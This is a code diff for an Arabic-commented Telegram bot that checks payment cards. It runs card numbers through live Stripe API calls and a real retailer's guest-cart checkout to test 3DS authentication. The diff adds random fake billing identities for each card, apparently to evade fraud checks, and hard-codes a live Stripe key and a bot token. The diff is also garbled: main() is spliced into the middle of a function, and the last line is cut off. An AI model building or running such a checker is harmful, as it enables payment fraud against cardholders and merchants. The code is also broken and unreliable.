@@ -1,5 +1,7 @@
 import os
 import asyncio
+import random
+import string
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
@@ -10,6 +12,48 @@ import base64
 # ========== الإعدادات ==========
 BOT_TOKEN = "8166484030:AAHwrm95j131yJxvtlNTAe6S57f5kcfU1ow"
 ADMIN_IDS = [5895491379, 844663875]
+
+# ========== إعدادات السلة - غير هنا بس ==========
+CART_ID = "0Xodo8RBE1CCeaoEix4npV5G3OYOBxOM"  # 👈 غير السلة من هنا
+
+# ========== Stripe Key ==========
+STRIPE_KEY = "pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X"
+
+# ========== بيانات وهمية ==========
+FIRST_NAMES = ["John", "Mike", "Sarah", "Emma", "David", "Lisa", "Tom", "Anna", "James", "Maria"]
+LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Moore"]
+STREETS = ["Main Street", "Oak Avenue", "Park Road", "Cedar Lane", "Maple Drive", "Hill Street", "Lake View", "Forest Road"]
+CITIES = ["Springfield", "Madison", "Franklin", "Clinton", "Georgetown", "Salem", "Bristol", "Oxford"]
+STATES = ["AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA", "HI", "ID", "IL", "IN", "IA"]
+
+def generate_fake_data():
+    """توليد بيانات وهمية عشوائية"""
+    first = random.choice(FIRST_NAMES)
+    last = random.choice(LAST_NAMES)
+    street_num = random.randint(100, 999)
+    street = random.choice(STREETS)
+    city = random.choice(CITIES)
+    state = random.choice(STATES)
+    zipcode = ''.join(random.choices(string.digits, k=5))
+    phone = f"{''.join(random.choices(string.digits, k=10))}"
+    
+    # توليد بريد إلكتروني عشوائي
+    email_providers = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
+    random_chars = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+    email = f"{first.lower()}{random_chars}@{random.choice(email_providers)}"
+    
+    return {
+        'firstname': first,
+        'lastname': last,
+        'email': email,
+        'phone': phone,
+        'street1': f"{street_num} {street}",
+        'street2': ''.join(random.choices(string.ascii_uppercase, k=4)),  # عنوان ثانوي عشوائي
+        'city': city,
+        'state': state,
+        'zipcode': zipcode,
+        'full_name': f"{first} {last}"
+    }
 
 # ========== إحصائيات ==========
 stats = {
@@ -47,6 +91,9 @@ class StripeChecker:
         
     def check(self, card_number, exp_month, exp_year, cvv):
         try:
+            # 🎲 توليد بيانات وهمية جديدة لكل بطاقة
+            fake_data = generate_fake_data()
+            
             headers = self.headers.copy()
             headers.update({
                 'content-type': 'application/x-www-form-urlencoded',
@@ -54,7 +101,25 @@ class StripeChecker:
                 'referer': 'https://js.stripe.com/',
             })
             
-            data = f'billing_details[address][state]=CO&billing_details[address][postal_code]=11333&billing_details[address][country]=US&billing_details[address][city]=Napoleon&billing_details[address][line1]=111+North+Street&billing_details[address][line2]=sagh&billing_details[email]=test23627@gmail.com&billing_details[name]=Card+Test&billing_details[phone]=3609998856&type=card&card[number]={card_number}&card[cvc]={cvv}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
+            # استخدام البيانات الوهمية
+            data = (
+                f'billing_details[address][state]={fake_data["state"]}'
+                f'&billing_details[address][postal_code]={fake_data["zipcode"]}'
+                f'&billing_details[address][country]=US'
+                f'&billing_details[address][city]={fake_data["city"]}'
+                f'&billing_details[address][line1]={requests.utils.quote(fake_data["street1"])}'
+                f'&billing_details[address][line2]={fake_data["street2"]}'
+                f'&billing_details[email]={fake_data["email"]}'
+                f'&billing_details[name]={requests.utils.quote(fake_data["full_name"])}'
+                f'&billing_details[phone]={fake_data["phone"]}'
+                f'&type=card'
+                f'&card[number]={card_number}'
+                f'&card[cvc]={cvv}'
+                f'&card[exp_year]={exp_year}'
+                f'&card[exp_month]={exp_month}'
+                f'&key={STRIPE_KEY}'
+                f'&_stripe_version=2020-03-02'
+            )
             
             r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
             pm = r.json()
@@ -69,26 +134,31 @@ class StripeChecker:
                 'referer': 'https://www.ironmongeryworld.com/',
             })
             
+            # استخدام البيانات الوهمية + السلة المتغيرة
             payload = {
-                'cartId': '0Xodo8RBE1CCeaoEix4npV5G3OYOBxOM',
+                'cartId': CART_ID,  # 👈 استخدام السلة من المتغير
                 'billingAddress': {
                     'countryId': 'US',
                     'regionId': '13',
-                    'street': ['111 North Street', 'sagh'],
-                    'telephone': '3609998856',
-                    'postcode': '11333',
-                    'city': 'Napoleon',
-                    'firstname': 'saad',
-                    'lastname': 'saad',
+                    'street': [fake_data['street1'], fake_data['street2']],
+                    'telephone': fake_data['phone'],
+                    'postcode': fake_data['zipcode'],
+                    'city': fake_data['city'],
+                    'firstname': fake_data['firstname'],
+                    'lastname': fake_data['lastname'],
                 },
                 'paymentMethod': {
                     'method': 'stripe_payments',
                     'additional_data': {'payment_method': pm_id},
                 },
-                'email': 'test23627@gmail.com',
+                'email': fake_data['email'],
             }
             
-            r = self.session.post('https://www.ironmongeryworld.com/rest/default/V1/guest-carts/0Xodo8RBE1CCeaoEix4npV5G3OYOBxOM/payment-information', headers=headers, json=payload)
+            r = self.session.post(
+                f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information',
+                headers=headers, 
+                json=payload
+            )
             res = r.json()
             if 'message' not in res or 'pi_' not in res['message']:
                 return 'DECLINED', 'Payment intent creation failed'
@@ -101,7 +171,7 @@ class StripeChecker:
                 'referer': 'https://js.stripe.com/',
             })
             
-            params = f'client_secret={client_secret}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
+            params = f'client_secret={client_secret}&key={STRIPE_KEY}'
             r = self.session.get(f'https://api.stripe.com/v1/payment_intents/{pi_id}?{params}', headers=headers)
             pi = r.json()
             
@@ -127,7 +197,7 @@ class StripeChecker:
                 "browserUserAgent": "Mozilla/5.0"
             })
             
-            data = f'source={source}&browser={requests.utils.quote(browser)}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
+            data = f'source={source}&browser={requests.utils.quote(browser)}&key={STRIPE_KEY}'
             
             headers = self.headers.copy()
             headers.update({
@@ -150,7 +220,6 @@ class StripeChecker:
                         creq = auth['creq']
                         acs_url = auth['ares']['acsURL']
                         
-                        # إعداد headers مع cookies للطلب
                         challenge_headers = {
                             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                             'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -172,7 +241,6 @@ class StripeChecker:
                         
                         challenge_data = {'creq': creq}
                         
-                        # إرسال الطلب
                         challenge_response = self.session.post(
                             acs_url,
                             headers=challenge_headers,
@@ -181,10 +249,8 @@ class StripeChecker:
                             allow_redirects=True
                         )
                         
-                        # فحص الرد
                         html_response = challenge_response.text
                         
-                        # فحص جميع حالات الفشل
                         failure_keywords = [
                             'Authentication failed',
                             'authentication failed',
@@ -198,7 +264,6 @@ class StripeChecker:
                             return 'FAILED_AUTH', 'Authentication failed in challenge'
                         
                     except Exception as e:
-                        # لو حصل خطأ في الفحص، نكمل عادي ونعتبرها C
                         pass
                 
                 return status, f'3DS Status: {status}'
@@ -295,7 +360,75 @@ async def check_card(card, bot_app):
             stats['checking'] -= 1
             stats['last_response'] = 'Authenticated ✅'
             await update_dashboard(bot_app)
-            await send_result(bot_app, card, "Y", message)
+            await send_final_files(bot_app)
+    
+    final_text = (
+        "╔═══════════════════╗\n"
+        "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
+        "╚═══════════════════╝\n\n"
+        "✅ تم إرسال جميع الملفات\n"
+        "📊 شكراً لاستخدامك البوت!\n\n"
+        "⚡️ Stripe 3DS Gateway"
+    )
+    
+    await bot_app.bot.send_message(
+        chat_id=stats['chat_id'],
+        text=final_text,
+        parse_mode='Markdown'
+    )
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
+        return
+
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    
+    if query.from_user.id not in ADMIN_IDS:
+        await query.answer("❌ غير مصرح", show_alert=True)
+        return
+    
+    try:
+        await query.answer()
+    except:
+        pass
+    
+    if query.data == "stop_check":
+        if stats['is_running']:
+            stats['is_running'] = False
+            stats['checking'] = 0
+            stats['last_response'] = 'Stopped 🛑'
+            await update_dashboard(context.application)
+            try:
+                await context.application.bot.send_message(
+                    chat_id=stats['chat_id'],
+                    text="🛑 **تم إيقاف الفحص بواسطة المستخدم!**",
+                    parse_mode='Markdown'
+                )
+            except:
+                pass
+
+def main():
+    print("[🤖] Starting Stripe 3DS Telegram Bot...")
+    print(f"[🛒] Cart ID: {CART_ID}")
+    print("[✅] Bot will send results in chat (no channel)")
+    print("[✅] Using asyncio.create_task (no threading)")
+    print("[✅] Failed Authentication detection enabled")
+    print("[🎲] Random fake data generator enabled")
+    
+    app = Application.builder().token(BOT_TOKEN).build()
+    
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
+    app.add_handler(CallbackQueryHandler(button_callback))
+    
+    print("[✅] Bot is running...")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()d_result(bot_app, card, "Y", message)
             return card, "Y", message
             
         elif status == 'FAILED_AUTH':
@@ -471,7 +604,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "❌ N - Not Authenticated\n"
         "🔴 U - Unavailable\n"
         "❌ Declined/Rejected (R)\n"
-        "❌ Failed Auth - فشل المصادقة",
+        "❌ Failed Auth - فشل المصادقة\n\n"
+        f"🛒 **Cart ID:** `{CART_ID}`",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
@@ -555,9 +689,9 @@ async def process_cards(cards, bot_app):
     await update_dashboard(bot_app)
     
     summary_text = (
-        "━━━━━━━━━━━━━━━━━━━\n"
+        "┏━━━━━━━━━━━━━━━━━━┓\n"
         "✅ **اكتمل الفحص!** ✅\n"
-        "━━━━━━━━━━━━━━━━━━━\n\n"
+        "┗━━━━━━━━━━━━━━━━━━┛\n\n"
         f"📊 **الإحصائيات النهائية:**\n"
         f"🔥 الإجمالي: {stats['total']}\n"
         f"✅ Authenticated (Y): {stats['authenticated']}\n"
@@ -577,70 +711,4 @@ async def process_cards(cards, bot_app):
         parse_mode='Markdown'
     )
     
-    await send_final_files(bot_app)
-    
-    final_text = (
-        "╔═══════════════════╗\n"
-        "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
-        "╚═══════════════════╝\n\n"
-        "✅ تم إرسال جميع الملفات\n"
-        "📊 شكراً لاستخدامك البوت!\n\n"
-        "⚡️ Stripe 3DS Gateway"
-    )
-    
-    await bot_app.bot.send_message(
-        chat_id=stats['chat_id'],
-        text=final_text,
-        parse_mode='Markdown'
-    )
-
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
-        return
-
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    
-    if query.from_user.id not in ADMIN_IDS:
-        await query.answer("❌ غير مصرح", show_alert=True)
-        return
-    
-    try:
-        await query.answer()
-    except:
-        pass
-    
-    if query.data == "stop_check":
-        if stats['is_running']:
-            stats['is_running'] = False
-            stats['checking'] = 0
-            stats['last_response'] = 'Stopped 🛑'
-            await update_dashboard(context.application)
-            try:
-                await context.application.bot.send_message(
-                    chat_id=stats['chat_id'],
-                    text="🛑 **تم إيقاف الفحص بواسطة المستخدم!**",
-                    parse_mode='Markdown'
-                )
-            except:
-                pass
-
-def main():
-    print("[🤖] Starting Stripe 3DS Telegram Bot...")
-    print("[✅] Bot will send results in chat (no channel)")
-    print("[✅] Using asyncio.create_task (no threading)")
-    print("[✅] Failed Authentication detection enabled")
-    
-    app = Application.builder().token(BOT_TOKEN).build()
-    
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-    app.add_handler(CallbackQueryHandler(button_callback))
-    
-    print("[✅] Bot is running...")
-    app.run_polling()
-
-if __name__ == "__main__":
-    main()
+    await sen
